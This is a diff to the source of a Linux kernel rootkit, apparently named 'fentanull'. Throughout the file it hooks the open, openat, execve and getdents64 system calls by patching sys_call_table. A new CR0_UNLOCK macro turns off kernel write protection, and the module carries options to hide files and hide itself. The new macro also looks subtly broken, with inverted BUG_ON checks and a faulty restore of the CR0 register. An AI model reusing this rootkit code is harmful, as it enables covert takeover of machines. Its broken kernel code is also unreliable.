@@ -8,6 +8,7 @@
 #include <linux/moduleparam.h>
 #include <asm/paravirt.h>   
 #include <asm/pgtable.h>    
+#include <asm/processor-flags.h> 
 #include <linux/fcntl.h> 
 #include <linux/uaccess.h> /* for copy_from_user */ 
 #include <linux/string.h>
@@ -71,34 +72,24 @@ module_param(hook_type, int, S_IRUSR);
 
 inline void custom_write_cr0(unsigned long cr0)
 { 
+	unsigned long __force_order;
 	asm volatile("mov %0,%%cr0" : "+r"(cr0), "+m"(__force_order));
 }
 
-static inline void cr0_enable(int mode)
-{ 
-	switch(mode)
-	{
-		case 1: 
-		{
-			unsigned long cr0 = read_cr0();
-			custom_write_cr0(cr0 & (~0x00010000));
-			#ifdef DEBUG
-			printk(KERN_ALERT "[-] rk[cr0]: enabled!\n"); 
-			#endif 	
-			break;
-		}
-		case 0: 
-		{	
-			unsigned long cr0 = read_cr0();
-			custom_write_cr0(cr0 | (0x00010000));
-			#ifdef DEBUG
-			printk(KERN_ALERT "[-] rk[cr0]: disabled!\n"); 
-			#endif
-			break;
-		}
-	}
-	return;
-} 
+#define CR0_UNLOCK(x) \
+	do { \ 
+		unsigned long cr0; \ 
+		preempt_disable(); \
+		cr0 = read_cr0(); \
+		BUG_ON(unlikely((cr0 & X86_CR0_WP))); \
+		custom_write_cr0(cr0 & (~X86_CR0_WP)); \
+		printk(KERN_ALERT "[-] rk[cr0]: enabled!\n"); \ 
+		x; \
+		BUG_ON(unlikely(!(cr0 & X86_CR0_WP))); \  
+		custom_write_cr0(cr0 | (~X86_CR0_WP)); \
+		printk(KERN_ALERT "[-] rk[cr0]: disabled!\n"); \
+		preempt_enable(); \
+	} while(0)
 
 static inline void pte_enable(int mode)
 { 
@@ -251,10 +242,7 @@ asmlinkage fentanull_getdents64(unsigned int fd, struct linux_dirent64 *dirp, un
 void set_openat(int hook)
 { 
 	/* hook == 1: hook function 
-	 * hook == 0: unhook function
-	 * method == 1: use cr0
-	 * method == 0: use pte */
-
+	 * hook == 0: unhook function */
 	unsigned int lvl;
 	pte = lookup_address((long unsigned int)sys_call_table, &lvl); 
 	if (hook==1)
@@ -264,7 +252,7 @@ void set_openat(int hook)
 		printk(KERN_ALERT "[-] rk: hooking openat");
 		#endif
 		old_openat = (old_openat_type)sys_call_table[__NR_openat]; 
-		sys_call_table[__NR_openat] = (unsigned long)fentanull_openat;
+		CR0_UNLOCK({sys_call_table[__NR_openat] = (unsigned long)fentanull_openat;});
 		#ifdef DEBUG
 		printk(KERN_ALERT "[-] rk: openat located at %p\n", old_openat);
 		printk(KERN_ALERT "[-] rk: openat hooked\n");
@@ -276,7 +264,7 @@ void set_openat(int hook)
 		#ifdef DEBUG 
 		printk(KERN_ALERT "[-] rk: unhooking openat\n"); 
 		#endif 
-		sys_call_table[__NR_openat] = (unsigned long)old_openat;
+		CR0_UNLOCK({sys_call_table[__NR_openat] = (unsigned long)old_openat;}); 
 		#ifdef DEBUG
 		printk(KERN_ALERT "[-] rk: openat located at %p\n", old_openat);
 		printk(KERN_ALERT "[-] rk: openat unhooked\n");
@@ -287,18 +275,15 @@ void set_openat(int hook)
 
 void set_open(int hook)
 { 
-	/* hook == 1: hook function 
-	 * hook == 0: unhook function
-	 * method == 1: use cr0
-	 * method == 0: use pte */
 
 	unsigned int lvl;
+
 	pte = lookup_address((long unsigned int)sys_call_table, &lvl); 
 	if (hook==1)
 	{
 		/* HOOK ITTTTT */
 		old_open = (old_open_type)sys_call_table[__NR_open]; 
-		sys_call_table[__NR_open] = (unsigned long)fentanull_open;
+		CR0_UNLOCK({sys_call_table[__NR_open] = (unsigned long)fentanull_open;});		
 		#ifdef DEBUG
 		printk(KERN_ALERT "[-] rk: open located at %p\n", old_open);
 		printk(KERN_ALERT "[-] rk: open hooked\n");
@@ -310,7 +295,7 @@ void set_open(int hook)
 		#ifdef DEBUG 
 		printk(KERN_ALERT "[-] rk: unhooking open\n"); 
 		#endif 
-		sys_call_table[__NR_open] = (unsigned long)old_open;
+		CR0_UNLOCK({sys_call_table[__NR_open] = (unsigned long)old_open;});
 		#ifdef DEBUG
 		printk(KERN_ALERT "[-] rk: open located at %p\n", old_open);
 		printk(KERN_ALERT "[-] rk: open unhooked\n");
@@ -322,10 +307,7 @@ void set_open(int hook)
 void set_execve(int hook)
 { 
 	/* hook == 1: hook function 
-	 * hook == 0: unhook function
-	 * method == 1: use cr0
-	 * method == 0: use pte */
-
+	 * hook == 0: unhook function */
 	unsigned int lvl;
 	pte = lookup_address((long unsigned int)sys_call_table, &lvl); 
 	if (hook==1)
@@ -335,7 +317,7 @@ void set_execve(int hook)
 		printk(KERN_ALERT "[-] rk: hooking execve");
 		#endif
 		old_execve = (old_execve_type)sys_call_table[__NR_execve]; 
-		sys_call_table[__NR_execve] = (unsigned long)fentanull_execve;
+		CR0_UNLOCK({sys_call_table[__NR_execve] = (unsigned long)fentanull_execve;});
 		#ifdef DEBUG
 		printk(KERN_ALERT "[-] rk: execve located at %p\n", old_execve);
 		printk(KERN_ALERT "[-] rk: execve hooked\n");
@@ -347,7 +329,7 @@ void set_execve(int hook)
 		#ifdef DEBUG 
 		printk(KERN_ALERT "[-] rk: unhooking execve\n"); 
 		#endif 
-		sys_call_table[__NR_execve] = (unsigned long)old_execve;
+		CR0_UNLOCK({sys_call_table[__NR_execve] = (unsigned long)old_execve;}); 
 		#ifdef DEBUG
 		printk(KERN_ALERT "[-] rk: execve located at %p\n", old_execve);
 		printk(KERN_ALERT "[-] rk: execve unhooked\n");
@@ -359,10 +341,7 @@ void set_execve(int hook)
 void set_getdents64(int hook)
 { 
 	/* hook == 1: hook function 
-	 * hook == 0: unhook function
-	 * method == 1: use cr0
-	 * method == 0: use pte */
-
+	 * hook == 0: unhook function */
 	unsigned int lvl;
 	pte = lookup_address((long unsigned int)sys_call_table, &lvl); 
 	if (hook==1)
@@ -372,7 +351,7 @@ void set_getdents64(int hook)
 		printk(KERN_ALERT "[-] rk: hooking getdents64");
 		#endif
 		old_getdents64 = (old_getdents64_type)sys_call_table[__NR_getdents64]; 
-		sys_call_table[__NR_getdents64] = (unsigned long)fentanull_getdents64;
+		CR0_UNLOCK({sys_call_table[__NR_getdents64] = (unsigned long)fentanull_getdents64;});
 		#ifdef DEBUG
 		printk(KERN_ALERT "[-] rk: getdents64 located at %p\n", old_getdents64);
 		printk(KERN_ALERT "[-] rk: getdents64 hooked\n");
@@ -384,7 +363,7 @@ void set_getdents64(int hook)
 		#ifdef DEBUG 
 		printk(KERN_ALERT "[-] rk: unhooking getdents64\n"); 
 		#endif 
-		sys_call_table[__NR_getdents64] = (unsigned long)old_getdents64;
+		CR0_UNLOCK({sys_call_table[__NR_getdents64] = (unsigned long)old_getdents64;});
 		#ifdef DEBUG
 		printk(KERN_ALERT "[-] rk: getdents64 located at %p\n", old_getdents64);
 		printk(KERN_ALERT "[-] rk: getdents64 unhooked\n");
@@ -417,17 +396,14 @@ static int __init fentanull_init(void)
 		hidden.files = 1; 
 		#endif 
 		#ifdef HIDE_MODULES_ON_LOAD
-		mod_hide(); 
+		//mod_hide(); 
 		#endif 
 		if (hook_type == 1)
 		{
-			cr0_enable(1);
-
 			//set_openat(1); 
 			set_open(1); 
 			set_execve(1); 
 			set_getdents64(1);
-			cr0_enable(0);
 			return 0;	
 		}       
 		else if (hook_type == 0)
@@ -453,12 +429,10 @@ static void __exit fentanull_exit(void)
 	#endif 
 	if (hook_type == 1)
 	{
-		cr0_enable(1);
 		set_execve(0); 
 		set_open(0); 
-		//set_openat(0); 	
 		set_getdents64(0);
-		cr0_enable(0);
+		//set_openat(0);
 	}
 	else if (hook_type == 0)
 	{
